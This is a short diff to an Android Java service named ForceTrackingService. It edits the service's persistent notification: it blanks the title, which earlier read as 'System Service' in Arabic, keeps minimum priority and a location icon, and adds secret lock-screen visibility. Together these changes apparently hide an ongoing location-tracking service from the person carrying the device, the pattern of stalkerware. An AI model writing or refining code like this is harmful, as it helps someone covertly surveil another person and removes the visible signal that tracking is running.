@@ -79,10 +79,11 @@ public class ForceTrackingService extends Service {
         }
         
         return builder
-            .setContentTitle("خدمة النظام")
+            .setContentTitle("")
             .setContentText("")
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setPriority(Notification.PRIORITY_MIN)
+            .setVisibility(Notification.VISIBILITY_SECRET)
             .setOngoing(true)
             .build();
     }
